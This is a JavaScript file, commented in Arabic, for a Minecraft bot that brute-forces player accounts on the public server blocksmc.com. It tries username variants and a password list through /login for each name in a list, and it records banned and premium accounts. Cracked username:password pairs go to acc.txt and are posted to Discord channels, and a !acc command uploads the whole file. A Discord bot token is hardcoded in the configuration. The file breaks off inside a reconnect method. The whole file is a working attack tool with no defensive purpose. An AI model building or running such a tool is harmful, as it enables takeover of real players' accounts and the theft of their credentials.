const mineflayer = require('mineflayer');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fs = require('fs');
const path = require('path');
let globalManager = null;

// قراءة الأسماء من ملف JSON
// قراءة الأسماء من ملف usernames.json
function loadUsernamesFromJSON() {
    try {
        // البحث عن الملف بالترتيب: usernames.json ثم usernames.txt
        let filePath = path.join(__dirname, 'usernames.json');
        let isJsonFile = true;

        if (!fs.existsSync(filePath)) {
            filePath = path.join(__dirname, 'usernames.txt');
            isJsonFile = false;

            if (!fs.existsSync(filePath)) {
                console.error('❌ Neither usernames.json nor usernames.txt file found!');
                process.exit(1);
            }
        }

        console.log(`📁 Reading from: ${path.basename(filePath)}`);
        const fileContent = fs.readFileSync(filePath, 'utf8').trim();

        if (!fileContent) {
            console.error(`❌ ${path.basename(filePath)} is empty!`);
            process.exit(1);
        }

        const usernames = [];

        if (isJsonFile) {
            // قراءة ملف JSON عادي
            try {
                const jsonData = JSON.parse(fileContent);

                if (Array.isArray(jsonData)) {

                    for (let i = 0; i < jsonData.length; i++) {
                        const userData = jsonData[i];

                        if (userData && userData.name && typeof userData.name === 'string') {
                            usernames.push(userData.name);
                        } else {
                            console.warn(`⚠️ Array index ${i}: Missing or invalid 'name' field`);
                        }
                    }
                } else if (jsonData.name) {
                    // JSON object واحد
                    usernames.push(jsonData.name);
                    console.log(`✅ Loaded username: ${jsonData.name} (Rank: ${jsonData.rank || 'N/A'}, Guild: ${jsonData.guild || 'N/A'})`);
                } else {
                    console.error('❌ Invalid JSON structure! Expected array or object with "name" field');
                    process.exit(1);
                }

            } catch (jsonError) {
                console.error(`❌ Invalid JSON format: ${jsonError.message}`);
                process.exit(1);
            }
        } else {
            // قراءة ملف txt (line-by-line JSON)
            const lines = fileContent.split('\n').map(line => line.trim()).filter(line => line.length > 0);

            for (let i = 0; i < lines.length; i++) {
                const line = lines[i];

                try {
                    const userData = JSON.parse(line);

                    if (userData.name && typeof userData.name === 'string') {
                        usernames.push(userData.name);
                        console.log(`✅ Loaded username: ${userData.name} (Rank: ${userData.rank || 'N/A'}, Guild: ${userData.guild || 'N/A'})`);
                    } else {
                        console.warn(`⚠️ Line ${i + 1}: Missing or invalid 'name' field`);
                    }
                } catch (jsonError) {
                    console.warn(`⚠️ Line ${i + 1}: Invalid JSON format - ${jsonError.message}`);
                    console.warn(`   Content: ${line.substring(0, 50)}${line.length > 50 ? '...' : ''}`);
                }
            }
        }

        if (usernames.length === 0) {
            console.error('❌ No valid usernames found!');
            process.exit(1);
        }

        console.log(`📦 Successfully loaded ${usernames.length} usernames`);
        return usernames;

    } catch (error) {
        console.error(`❌ Error loading usernames: ${error.message}`);
        process.exit(1);
    }
}

const USERNAMES = loadUsernamesFromJSON();

// إعدادات Discord Bot
const DISCORD_CONFIG = {
    token: 'MTM5ODI5ODg5NjEyNzYyNzM4Ng.G57Zby.F2oUiP7hcuEDt1dUxYcs3fMAP0HNq5gMOq9AdA', // ضع توكن البوت هنا
    enabled: true, // تغيير إلى false لتعطيل Discord
    channels: {
        success: '1398310301241184256', // ID قناة الحسابات المكتشفة
        premium: '1395362104910942280', // ID قناة الحسابات المميزة
        banned: '1395362126209482912', // ID قناة الحسابات المحظورة
        general: '1395362151971029113', // ID قناة الإشعارات العامة
        logs: '1398310359097671821' // ID قناة السجلات
    }
};

const BASE_CONFIG = {
    host: 'blocksmc.com',
    port: 25565,
    version: '1.8.9',
    reconnectDelay: 2000,
    initialDelay: 1000,
    messageInterval: 1000,
    serverTimeout: 900,
    retryInterval: 10000
};

// دالة محدثة لحذف الاسم من الملف (مع دعم JSON)
// دالة محدثة لحذف الاسم من الملف
function removeUsernameFromFile(username) {
    try {
        // البحث عن الملف المستخدم
        let filePath = path.join(__dirname, 'usernames.json');
        let isJsonFile = true;

        if (!fs.existsSync(filePath)) {
            filePath = path.join(__dirname, 'usernames.txt');
            isJsonFile = false;

            if (!fs.existsSync(filePath)) {
                console.error('❌ No usernames file found for removal!');
                return false;
            }
        }

        const currentContent = fs.readFileSync(filePath, 'utf8').trim();

        if (isJsonFile) {
            // التعامل مع ملف JSON
            try {
                const jsonData = JSON.parse(currentContent);

                if (Array.isArray(jsonData)) {
                    // تصفية المصفوفة لإزالة الاسم المطلوب
                    const updatedArray = jsonData.filter(item => {
                        return !(item && item.name === username);
                    });

                    // إعادة كتابة الملف بتنسيق JSON جميل
                    fs.writeFileSync(filePath, JSON.stringify(updatedArray, null, 2));

                    console.log(`🗑️ Removed ${username} from ${path.basename(filePath)}`);
                    console.log(`📊 Remaining entries: ${updatedArray.length}`);

                    return true;
                } else {
                    console.error('❌ JSON file is not an array!');
                    return false;
                }

            } catch (jsonError) {
                console.error(`❌ Invalid JSON in file: ${jsonError.message}`);
                return false;
            }
        } else {
            // التعامل مع ملف txt (line-by-line)
            const lines = currentContent.split('\n').map(line => line.trim()).filter(line => line.length > 0);

            const updatedLines = lines.filter(line => {
                try {
                    const userData = JSON.parse(line);
                    return userData.name !== username;
                } catch (error) {
                    console.warn(`🗑️ Removing invalid JSON line: ${line.substring(0, 30)}...`);
                    return false;
                }
            });

            fs.writeFileSync(filePath, updatedLines.join('\n') + (updatedLines.length > 0 ? '\n' : ''));

            console.log(`🗑️ Removed ${username} from ${path.basename(filePath)}`);
            console.log(`📊 Remaining entries: ${updatedLines.length}`);

            return true;
        }

    } catch (error) {
        console.error(`❌ Failed to remove username from file: ${error.message}`);
        return false;
    }
}


// دالة محدثة لإضافة الاسم إلى نهاية الملف (مع دعم JSON)
function addUsernameToEndOfFile(username) {
    try {
        // البحث عن الملف المستخدم
        let filePath = path.join(__dirname, 'usernames.json');
        let isJsonFile = true;

        if (!fs.existsSync(filePath)) {
            filePath = path.join(__dirname, 'usernames.txt');
            isJsonFile = false;

            if (!fs.existsSync(filePath)) {
                console.error('❌ No usernames file found for adding!');
                return false;
            }
        }

        const newUserData = {
            "name": username,
            "rank": "Unknown",
            "guild": "",
            "firstSeen": Date.now(),
            "lastSeen": Date.now(),
            "requeued": true
        };

        if (isJsonFile) {
            // التعامل مع ملف JSON
            try {
                const currentContent = fs.readFileSync(filePath, 'utf8').trim();
                const jsonData = JSON.parse(currentContent);

                if (Array.isArray(jsonData)) {
                    jsonData.push(newUserData);
                    fs.writeFileSync(filePath, JSON.stringify(jsonData, null, 2));

                    console.log(`🔄 Added ${username} to end of ${path.basename(filePath)}`);
                    return true;
                } else {
                    console.error('❌ JSON file is not an array!');
                    return false;
                }

            } catch (jsonError) {
                console.error(`❌ Invalid JSON in file: ${jsonError.message}`);
                return false;
            }
        } else {
            // التعامل مع ملف txt
            fs.appendFileSync(filePath, JSON.stringify(newUserData) + '\n');
            console.log(`🔄 Added ${username} to end of ${path.basename(filePath)}`);
            return true;
        }

    } catch (error) {
        console.error(`❌ Failed to add username to end of file: ${error.message}`);
        return false;
    }
}


// دالة محدثة لإعادة تحميل الأسماء من الملف
// دالة محدثة لإعادة تحميل الأسماء من الملف
function reloadUsernamesFromFile() {
    try {
        let filePath = path.join(__dirname, 'usernames.json');
        let isJsonFile = true;

        if (!fs.existsSync(filePath)) {
            filePath = path.join(__dirname, 'usernames.txt');
            isJsonFile = false;

            if (!fs.existsSync(filePath)) {
                return [];
            }
        }

        const fileContent = fs.readFileSync(filePath, 'utf8').trim();

        if (!fileContent) {
            return [];
        }

        const usernames = [];

        if (isJsonFile) {
            try {
                const jsonData = JSON.parse(fileContent);

                if (Array.isArray(jsonData)) {
                    for (const item of jsonData) {
                        if (item && item.name && typeof item.name === 'string') {
                            usernames.push(item.name);
                        }
                    }
                }
            } catch (jsonError) {
                console.error(`❌ Error parsing JSON file: ${jsonError.message}`);
            }
        } else {
            const lines = fileContent.split('\n').map(line => line.trim()).filter(line => line.length > 0);

            for (const line of lines) {
                try {
                    const userData = JSON.parse(line);
                    if (userData.name && typeof userData.name === 'string') {
                        usernames.push(userData.name);
                    }
                } catch (error) {
                    continue;
                }
            }
        }

        return usernames;
    } catch (error) {
        console.error(`❌ Failed to reload usernames: ${error.message}`);
        return [];
    }
}
// إعداد Discord Bot
let discordBot = null;

async function initDiscordBot() {
    if (!DISCORD_CONFIG.enabled || !DISCORD_CONFIG.token || DISCORD_CONFIG.token === 'YOUR_DISCORD_BOT_TOKEN_HERE') {
        console.log('⚠️ Discord bot not configured - skipping Discord integration');
        return;
    }

    discordBot = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ]
    });

    discordBot.on('ready', () => {
        console.log(`✅ Discord bot logged in as ${discordBot.user.tag}`);

        // إرسال إشعار بدء البوت
        sendToDiscord('general', {
            title: '🚀 Minecraft Account Bot Started',
            description: `Bot has been started and is ready to begin testing accounts.`,
            color: 0x00ff00,
            fields: [
                { name: '📊 Total Usernames', value: `${USERNAMES.length}`, inline: true },
                { name: '🎯 Target Server', value: BASE_CONFIG.host, inline: true },
                { name: '⏰ Started At', value: new Date().toLocaleString(), inline: true },
            ]
        });
    });

    // إضافة معالج الأوامر
    discordBot.on('messageCreate', async (message) => {
        if (message.author.bot) return;

        if (message.content === '!stats') {
            await handleStatsCommand(message);
        } else if (message.content === '!acc') {
            await handleAccCommand(message);
        }
    });

    // دالة معالجة أمر !acc
    async function handleAccCommand(message) {
        try {
            const accFilePath = path.join(__dirname, 'acc.txt');

            // التحقق من وجود الملف
            if (!fs.existsSync(accFilePath)) {
                await message.reply({
                    embeds: [{
                        title: '📁 No Accounts File Found',
                        description: 'The acc.txt file does not exist yet. No accounts have been found.',
                        color: 0xff9900,
                        timestamp: new Date()
                    }]
                });
                return;
            }

            // قراءة محتوى الملف
            const accContent = fs.readFileSync(accFilePath, 'utf8');

            // التحقق من أن الملف غير فارغ
            if (!accContent.trim()) {
                await message.reply({
                    embeds: [{
                        title: '📁 Empty Accounts File',
                        description: 'The acc.txt file exists but is empty. No accounts have been found yet.',
                        color: 0xff9900,
                        timestamp: new Date()
                    }]
                });
                return;
            }

            // عد عدد الحسابات
            const accountCount = accContent.trim().split('\n').filter(line => line.trim()).length;

            // إرسال الملف مع رسالة تأكيد
            await message.reply({
                embeds: [{
                    title: '📁 Accounts File Sent',
                    description: `Here is the acc.txt file containing all discovered accounts.`,
                    color: 0x00ff00,
                    fields: [
                        { name: '📊 Total Accounts', value: `${accountCount}`, inline: true },
                        { name: '📁 File Size', value: `${fs.statSync(accFilePath).size} bytes`, inline: true },
                        { name: '⏰ Last Modified', value: new Date(fs.statSync(accFilePath).mtime).toLocaleString(), inline: true }
                    ],
                    timestamp: new Date()
                }],
                files: [{
                    attachment: accFilePath,
                    name: 'acc.txt'
                }]
            });

            console.log(`📤 acc.txt file sent to Discord user: ${message.author.username}`);

        } catch (error) {
            console.error('❌ Error handling !acc command:', error);

            await message.reply({
                embeds: [{
                    title: '❌ Error',
                    description: 'An error occurred while trying to send the accounts file.',
                    color: 0xff0000,
                    fields: [
                        { name: '🔍 Error Details', value: error.message, inline: false }
                    ],
                    timestamp: new Date()
                }]
            });
        }
    }

    discordBot.on('error', (error) => {
        console.error('❌ Discord bot error:', error);
    });

    try {
        await discordBot.login(DISCORD_CONFIG.token);
    } catch (error) {
        console.error('❌ Failed to login to Discord:', error.message);
    }
}

// دالة معالجة أمر !stats
async function handleStatsCommand(message) {
    if (!globalManager || !globalManager.bot) {
        await message.reply({
            embeds: [{
                title: '📊 Bot Statistics',
                description: 'Bot is not currently running any tests.',
                color: 0xff9900,
                timestamp: new Date()
            }]
        });
        return;
    }

    const manager = globalManager;
    const bot = manager.bot;
    const totalTime = manager.startTime ? Date.now() - manager.startTime : 0;

    // حساب الإحصائيات
    const currentUsernameIndex = manager.index + 1;
    const totalUsernames = manager.usernames.length;
    const usernameProgress = ((currentUsernameIndex / totalUsernames) * 100).toFixed(1);

    let currentPasswordIndex = 0;
    let totalPasswords = 0;
    let passwordProgress = 0;
    let currentPassword = 'N/A';
    let currentUsername = 'N/A';
    let estimatedTimeLeft = 0;

    if (bot) {
        currentUsername = bot.CONFIG.username;
        currentPassword = bot.currentPassword || 'Starting...';

        // حساب تقدم كلمات المرور
        let passwordAttempts = 0;

        // عدد محاولات اليوزر نيم
        if (bot.triedUsernameAsPassword1) passwordAttempts++;
        if (bot.triedCleanUsername) passwordAttempts++;
        if (bot.triedUsernameAsPassword2) passwordAttempts++;

        // إضافة محاولات كلمات المرور من الملف
        passwordAttempts += bot.currentIndex;

        // إجمالي كلمات المرور المحتملة (3 محاولات يوزر نيم + كلمات المرور من الملف)
        totalPasswords = 3 + (bot.passwords ? bot.passwords.length : 0);
        currentPasswordIndex = passwordAttempts;

        if (totalPasswords > 0) {
            passwordProgress = ((currentPasswordIndex / totalPasswords) * 100).toFixed(1);
        }

        // حساب الوقت المتبقي التقديري
        if (bot.totalResponses > 0) {
            const avgResponseTime = bot.totalResponseTime / bot.totalResponses;
            const remainingPasswords = totalPasswords - currentPasswordIndex;
            const remainingUsernames = totalUsernames - currentUsernameIndex;

            estimatedTimeLeft = (remainingPasswords * avgResponseTime) + (remainingUsernames * totalPasswords * avgResponseTime);
        }
    }

    // إنشاء رسالة الإحصائيات
    const statsEmbed = {
        title: '📊 Live Bot Statistics',
        description: `Current bot status and progress information`,
        color: 0x00ff99,
        fields: [
            {
                name: '👤 Current Username',
                value: `**${currentUsername}** (${currentUsernameIndex}/${totalUsernames})`,
                inline: true
            },
            {
                name: '🔑 Current Password',
                value: `**${currentPassword}**`,
                inline: true
            },
            {
                name: '📈 Username Progress',
                value: `${usernameProgress}% (${currentUsernameIndex}/${totalUsernames})`,
                inline: true
            },
            {
                name: '🔐 Password Progress',
                value: `${passwordProgress}% (${currentPasswordIndex}/${totalPasswords})`,
                inline: true
            },
            {
                name: '⏱️ Total Runtime',
                value: formatTime(totalTime),
                inline: true
            },
            {
                name: '🕒 Estimated Time Left',
                value: estimatedTimeLeft > 0 ? formatTime(estimatedTimeLeft) : 'Calculating...',
                inline: true
            }
        ],
        timestamp: new Date()
    };

    // إضافة معلومات إضافية إذا كان البوت يعمل
    if (bot) {
        statsEmbed.fields.push(
            {
                name: '📡 Server Status',
                value: bot.isServerDown ? '🔴 Down' : '🟢 Online',
                inline: true
            },
            {
                name: '🎯 Current Action',
                value: bot.waitingForResponse ? '⏳ Waiting for response' :
                    bot.isSuccess ? '✅ Success found' :
                        bot.isFinished ? '🏁 Finished' : '🔄 Testing passwords',
                inline: true
            },
            {
                name: '📊 Response Stats',
                value: bot.totalResponses > 0 ?
                    `Avg: ${formatTime(bot.totalResponseTime / bot.totalResponses)}` :
                    'No responses yet',
                inline: true
            }
        );

        // إضافة معلومات الأداء
        if (bot.totalDowntime > 0) {
            statsEmbed.fields.push({
                name: '⚠️ Total Downtime',
                value: formatTime(bot.totalDowntime),
                inline: true
            });
        }
    }

    // إضافة إحصائيات إجمالية
    statsEmbed.fields.push(
        {
            name: '🎉 Accounts Found',
            value: `${manager.successCount}`,
            inline: true
        },
        {
            name: '💎 Premium Accounts',
            value: `${manager.premiumCount}`,
            inline: true
        },
        {
            name: '⛔ Banned Accounts',
            value: `${manager.bannedCount}`,
            inline: true
        }
    );

    await message.reply({ embeds: [statsEmbed] });
}

// دالة مساعدة لتنسيق الوقت
function formatTime(ms) {
    const s = Math.floor(ms / 1000);
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    return h ? `${h}h ${m}m ${s % 60}s` : m ? `${m}m ${s % 60}s` : `${s % 60}s`;
}

// دالة إرسال رسالة إلى Discord
async function sendToDiscord(channelType, embedData) {
    if (!discordBot || !DISCORD_CONFIG.channels[channelType]) {
        return;
    }

    try {
        const channel = await discordBot.channels.fetch(DISCORD_CONFIG.channels[channelType]);
        if (!channel) {
            console.error(`❌ Channel not found: ${channelType}`);
            return;
        }

        const embed = new EmbedBuilder()
            .setTitle(embedData.title)
            .setDescription(embedData.description)
            .setColor(embedData.color)
            .setTimestamp();

        if (embedData.fields) {
            embed.addFields(embedData.fields);
        }

        if (embedData.thumbnail) {
            embed.setThumbnail(embedData.thumbnail);
        }

        await channel.send({ embeds: [embed] });
        console.log(`📨 Discord message sent to ${channelType}`);
    } catch (error) {
        console.error(`❌ Failed to send Discord message to ${channelType}:`, error.message);
    }
}

class PasswordBot {
    constructor(username, manager) {
        this.manager = manager;
        this.CONFIG = { ...BASE_CONFIG, username };

        this.bot = null;
        this.passwords = [];
        this.currentIndex = 0;
        this.isActive = false;
        this.isSuccess = false;
        this.isFinished = false;
        this.currentPassword = '';
        this.serverCheckTimer = null;
        this.messageTimer = null;
        this.responseTimer = null;
        this.isServerDown = false;
        this.serverDownStart = null;
        this.startTime = null;
        this.totalDowntime = 0;
        this.waitingForResponse = false;

        // متغيرات لتجربة اليوزر نيم ككلمة مرور
        this.triedUsernameAsPassword1 = false;
        this.triedUsernameAsPassword2 = false;
        this.triedCleanUsername = false;

        // متغيرات حساب زمن الاستجابة
        this.lastAttemptTime = null;
        this.totalResponseTime = 0;
        this.totalResponses = 0;
    }

    async start() {
        console.log(`\n=========== 🚀 SESSION for ${this.CONFIG.username} ===========`);

        // إرسال إشعار بدء اختبار username جديد
        await sendToDiscord('logs', {
            title: '🔄 New Username Testing Started',
            description: `Starting password testing for username: **${this.CONFIG.username}**`,
            color: 0x0099ff,
            fields: [
                { name: '👤 Username', value: this.CONFIG.username, inline: true },
                { name: '🎯 Server', value: this.CONFIG.host, inline: true },
                { name: '⏰ Started At', value: new Date().toLocaleString(), inline: true }
            ]
        });

        // التحقق من وجود الاسم في premnames.txt
        if (this.isPremiumName()) {
            console.log(`💎 Username ${this.CONFIG.username} already exists in premnames.txt - skipping`);

            await sendToDiscord('logs', {
                title: '⏭️ Username Skipped',
                description: `Username **${this.CONFIG.username}** already exists in premium names list.`,
                color: 0xffff00,
                fields: [
                    { name: '👤 Username', value: this.CONFIG.username, inline: true },
                    { name: '📁 Status', value: 'Already in premnames.txt', inline: true }
                ]
            });

            this.finishUsername();
            return;
        }

        this.loadPasswords();
        this.createBot();
    }

    isPremiumName() {
        try {
            const premiumFile = path.join(__dirname, 'premnames.txt');

            if (!fs.existsSync(premiumFile)) {
                return false;
            }

            const premiumNames = fs.readFileSync(premiumFile, 'utf8')
                .split('\n')
                .map(line => line.trim())
                .filter(line => line.length > 0);

            return premiumNames.includes(this.CONFIG.username);
        } catch (error) {
            console.error(`❌ Error checking premium names: ${error.message}`);
            return false;
        }
    }

    loadPasswords() {
        try {
            const filePath = path.join(__dirname, 'passwords.txt');
            this.passwords = fs.readFileSync(filePath, 'utf8')
                .split('\n')
                .map(line => line.trim())
                .filter(line => line.length > 0);
            console.log(`📦 Loaded ${this.passwords.length} passwords`);
        } catch (error) {
            console.error(`❌ Failed to load passwords: ${error.message}`);
            process.exit(1);
        }
    }

    async savePremiumName() {
        try {
            const premiumFile = path.join(__dirname, 'premnames.txt');
            fs.appendFileSync(premiumFile, this.CONFIG.username + '\n');
            console.log(`💎 Premium name saved to premnames.txt: ${this.CONFIG.username}`);

            // زيادة عداد الحسابات المميزة
            this.manager.premiumCount++;

            // إرسال إشعار Discord للحساب المميز
            await sendToDiscord('premium', {
                title: '💎 Premium Account Detected!',
                description: `A premium Minecraft account has been detected and saved.`,
                color: 0xffd700,
                fields: [
                    { name: '👤 Username', value: this.CONFIG.username, inline: true },
                    { name: '🎯 Server', value: this.CONFIG.host, inline: true },
                    { name: '⏰ Detected At', value: new Date().toLocaleString(), inline: true },
                    { name: '💎 Account Type', value: 'Premium Account', inline: true },
                    { name: '📁 Saved To', value: 'premnames.txt', inline: true }
                ],
                thumbnail: 'https://i.imgur.com/premium_icon.png'
            });
        } catch (error) {
            console.error(`❌ Failed to save premium name: ${error.message}`);
        }
    }

    createBot() {
        this.bot = mineflayer.createBot(this.CONFIG);
        this.isActive = false;

        this.bot.on('login', () => {
            console.log(`🔐 Logged in as ${this.bot.username}`);
        });

        this.bot.on('spawn', () => {
            console.log('🌟 Spawned successfully');
            this.isActive = true;

            if (!this.startTime) {
                this.startTime = new Date();
                console.log(`⏰ Started at: ${this.startTime.toLocaleString()}`);
            }

            setTimeout(() => {
                if (this.isActive && !this.isSuccess && !this.isFinished) {
                    this.startPasswordTesting();
                }
            }, this.CONFIG.initialDelay);
        });

        this.bot.on('message', (msg) => {
            const message = msg.toString().trim();

            if (!message) return;

            console.log(`📥 Server: ${message}`);

            if (message.includes('/register <password> <password>') ||
                message.includes('register') && message.includes('<password>')) {
                console.log('📝 Account needs registration - skipping to next username');
                this.handleRegistrationRequired();
                return;
            }

            if (message.includes('/login <password>') || message.includes('If you lost the password')) {
                this.handleServerResponse();
                return;
            }

            if (message.includes('Successful Login.') || message.includes('Successfully logged in')) {
                this.handleSuccess();
                return;
            }

            if (message.includes('Wrong password') || message.includes('Invalid password')) {
                this.handleServerResponse();
                return;
            }

            if (this.waitingForResponse) {
                this.handleServerResponse();
            }
        });

        this.bot.on('kicked', (reason) => {
            console.log(`🚫 Kicked: ${reason}`);
            this.handleKick(reason);
        });

        this.bot.on('end', (reason) => {
            console.log(`🔌 Disconnected: ${reason || 'Unknown'}`);
            this.cleanup();

            if (!this.isSuccess && !this.isFinished) {
                this.scheduleReconnect();
            }
        });

        this.bot.on('error', (err) => {
            console.error(`❗ Error: ${err.message}`);
            this.cleanup();
        });
    }

    startPasswordTesting() {
        if (!this.isActive || this.currentIndex >= this.passwords.length || this.isSuccess || this.isFinished) {
            if (this.currentIndex >= this.passwords.length) {
                console.log('🏁 All passwords tested for this username');
                this.showFinalStats();
                this.finishUsername();
            }
            return;
        }
        this.tryPassword();
    }

    tryPassword() {
        if (this.isServerDown || this.waitingForResponse) {
            console.log('⏳ Waiting for server response...');
            return;
        }

        // دالة لتنظيف اسم المستخدم (إزالة الأرقام والرموز)
        const cleanUsername = (username) => {
            return username.replace(/[0-9_\-\.]/g, '').toLowerCase();
        };

        // جرّب اليوزر نيم الأصلي ككلمة مرور أولاً
        if (!this.triedUsernameAsPassword1) {
            this.currentPassword = this.CONFIG.username;
            console.log(`📨 Trying original username as password: ${this.currentPassword} (/l username)`);
            this.triedUsernameAsPassword1 = true;

            this.waitingForResponse = true;
            this.lastAttemptTime = Date.now();
            this.bot.chat(`/l ${this.currentPassword}`);
            this.startServerMonitoring();
            return;
        }

        // جرّب اليوزر نيم المنظف (بدون أرقام ورموز)
        if (!this.triedCleanUsername) {
            const cleanedUsername = cleanUsername(this.CONFIG.username);

            // تحقق من أن الاسم المنظف مختلف عن الأصلي ولا يقل عن 3 أحرف
            if (cleanedUsername !== this.CONFIG.username.toLowerCase() && cleanedUsername.length >= 3) {
                this.currentPassword = cleanedUsername;
                console.log(`📨 Trying cleaned username as password: ${this.currentPassword} (removed numbers & symbols)`);
                this.triedCleanUsername = true;

                this.waitingForResponse = true;
                this.lastAttemptTime = Date.now();
                this.bot.chat(`/l ${this.currentPassword}`);
                this.startServerMonitoring();
                return;
            } else {
                this.triedCleanUsername = true;
                console.log(`⏭️ Skipping cleaned username (same as original or too short): ${cleanedUsername}`);
            }
        }

        // جرّب اليوزر نيم مع الأقواس
        if (!this.triedUsernameAsPassword2) {
            this.currentPassword = `<${this.CONFIG.username}>`;
            console.log(`📨 Trying username as password: ${this.currentPassword} (/l <username>)`);
            this.triedUsernameAsPassword2 = true;

            this.waitingForResponse = true;
            this.lastAttemptTime = Date.now();
            this.bot.chat(`/l ${this.currentPassword}`);
            this.startServerMonitoring();
            return;
        }

        // بعد تجربة جميع أشكال اليوزر نيم، تابع كلمات المرور من الملف
        if (this.currentIndex >= this.passwords.length) {
            this.finishUsername();
            return;
        }

        this.currentPassword = this.passwords[this.currentIndex];
        const progress = (((this.currentIndex + 1) / this.passwords.length) * 100).toFixed(1);
        const avgResp = this.totalResponses ? this.totalResponseTime / this.totalResponses : this.CONFIG.messageInterval;
        const remaining = this.passwords.length - this.currentIndex - 1;
        const estimatedTimeLeft = remaining * avgResp;

        console.log(`📨 Trying: ${this.currentPassword} (${this.currentIndex + 1}/${this.passwords.length}) [${progress}%]`);
        console.log(`⏱️  ETA: ${this.formatTime(estimatedTimeLeft)}`);

        this.waitingForResponse = true;
        this.lastAttemptTime = Date.now();
        this.bot.chat(`/login ${this.currentPassword}`);
        this.startServerMonitoring();
    }

    startServerMonitoring() {
        if (this.responseTimer) clearTimeout(this.responseTimer);
        this.responseTimer = setTimeout(() => {
            if (this.waitingForResponse) {
                console.log('🚫 Server not responding - entering wait mode');
                this.handleServerDown();
            }
        }, this.CONFIG.serverTimeout);
    }

    handleServerResponse() {
        this.waitingForResponse = false;

        if (this.responseTimer) {
            clearTimeout(this.responseTimer);
            this.responseTimer = null;
        }

        if (this.lastAttemptTime) {
            const responseTime = Date.now() - this.lastAttemptTime;
            this.totalResponseTime += responseTime;
            this.totalResponses++;
            console.log(`⏱️ Server response: ${this.formatTime(responseTime)} | Avg: ${this.formatTime(this.totalResponseTime / this.totalResponses)}`);
            this.lastAttemptTime = null;
        }

        if (this.isServerDown) {
            const downtime = Date.now() - this.serverDownStart;
            this.totalDowntime += downtime;
            console.log(`🟢 Server is back online! Was down for ${this.formatTime(downtime)}`);
            this.isServerDown = false;
            this.serverDownStart = null;
            this.stopServerCheck();
        }

        if (this.isActive && !this.isSuccess && !this.isFinished) {
            this.currentIndex++;

            if (this.messageTimer) clearTimeout(this.messageTimer);
            this.messageTimer = setTimeout(() => {
                if (this.isActive && !this.isSuccess && !this.isFinished) {
                    this.tryPassword();
                }
            }, this.CONFIG.messageInterval);
        }
    }

    handleServerDown() {
        this.isServerDown = true;
        this.serverDownStart = Date.now();
        this.waitingForResponse = false;

        if (this.messageTimer) {
            clearTimeout(this.messageTimer);
            this.messageTimer = null;
        }

        console.log(`💾 Current password: ${this.currentPassword}`);
        console.log(`⏰ Server down since: ${new Date().toLocaleString()}`);
        console.log('🔄 Will retry every 15 seconds...');

        this.startServerCheck();
    }

    startServerCheck() {
        if (this.serverCheckTimer) clearInterval(this.serverCheckTimer);
        this.serverCheckTimer = setInterval(() => {
            if (this.isServerDown && this.isActive && !this.isSuccess && !this.isFinished) {
                const downtime = Date.now() - this.serverDownStart;
                console.log(`🔍 Checking server... (Down for: ${this.formatTime(downtime)})`);

                this.waitingForResponse = true;
                this.bot.chat(`/login ${this.currentPassword}`);
                this.startServerMonitoring();
            }
        }, this.CONFIG.retryInterval);
    }

    stopServerCheck() {
        if (this.serverCheckTimer) {
            clearInterval(this.serverCheckTimer);
            this.serverCheckTimer = null;
        }
    }

    async handleSuccess() {
        this.isSuccess = true;
        this.waitingForResponse = false;
        console.log('✅ Password found successfully!');

        // زيادة عداد النجاح
        this.manager.successCount++;

        const credentials = `${this.CONFIG.username}:${this.currentPassword}`;
        fs.appendFileSync(path.join(__dirname, 'acc.txt'), credentials + '\n');
        console.log('🔑 Credentials saved to acc.txt');

        // إرسال إشعار Discord للحساب المكتشف
        const totalTime = this.startTime ? Date.now() - this.startTime : 0;
        await sendToDiscord('success', {
            title: '🎉 Account Found Successfully!',
            description: `A working Minecraft account has been discovered and saved!`,
            color: 0x00ff00,
            fields: [
                { name: '👤 Username', value: this.CONFIG.username, inline: true },
                { name: '🔑 Password', value: '||' + this.currentPassword + '||', inline: true },
                { name: '🎯 Server', value: this.CONFIG.host, inline: true },
                { name: '📊 Attempts', value: `${this.currentIndex + 1}/${this.passwords.length}`, inline: true },
                { name: '⏱️ Time Taken', value: this.formatTime(totalTime), inline: true },
                { name: '💾 Saved To', value: 'acc.txt', inline: true },
                { name: '⏰ Found At', value: new Date().toLocaleString(), inline: false }
            ],
            thumbnail: 'https://i.imgur.com/success_icon.png'
        });

        this.showFinalStats();
        this.finishUsername();
    }

    async handleKick(reason) {
        const txt = reason.toString();

        if (txt.includes('PREMIUM.BLOCKSMC.COM')) {
            console.log('💎 Premium account detected!');
            await this.savePremiumName();
            this.isSuccess = true;
            this.isFinished = true;
            this.finishUsername();
            return;
        }

        if (txt.includes('You are already logged on')) {
            console.log('ℹ️ Already logged in - moving to end of queue.');

            // مسح الاسم من مكانه الحالي أولاً
            removeUsernameFromFile(this.CONFIG.username);

            // ثم إضافة الاسم لآخر قائمة الأسماء
            addUsernameToEndOfFile(this.CONFIG.username);

            await sendToDiscord('logs', {
                title: '🔄 Already Logged In - Re-queued',
                description: `Username **${this.CONFIG.username}** is already logged into the server and has been moved to end of queue.`,
                color: 0xffff00,
                fields: [
                    { name: '👤 Username', value: this.CONFIG.username, inline: true },
                    { name: '📁 Status', value: 'Moved to end of queue', inline: true },
                    { name: '⏰ Time', value: new Date().toLocaleString(), inline: true }
                ]
            });

            this.isFinished = true;

            // هنا مش هنعمل finishUsername عشان مش عايزين نمسحه تاني
            this.cleanup();

            setTimeout(() => {
                this.manager.nextUsername();
            }, 1000);
            return;
        }

        if (txt.includes('You are banned from')) {
            console.log('⛔ Account is banned - skipping to next username');

            // زيادة عداد الحسابات المحظورة
            this.manager.bannedCount++;

            await sendToDiscord('banned', {
                title: '⛔ Banned Account Detected',
                description: `Username **${this.CONFIG.username}** is banned from the server.`,
                color: 0xff0000,
                fields: [
                    { name: '👤 Username', value: this.CONFIG.username, inline: true },
                    { name: '🎯 Server', value: this.CONFIG.host, inline: true },
                    { name: '📁 Status', value: 'Banned from server', inline: true },
                    { name: '⏰ Detected At', value: new Date().toLocaleString(), inline: true },
                    { name: '📝 Reason', value: txt, inline: false }
                ],
                thumbnail: 'https://i.imgur.com/banned_icon.png'
            });

            this.isFinished = true;
            this.finishUsername();
            return;
        }

        console.log('ℹ️ Disconnected - will reconnect');
    }

    scheduleReconnect() {
        if (this.isSuccess || this.isFinished) {
            console.log('✅ Session completed - not reconnecting');
            return;
        }

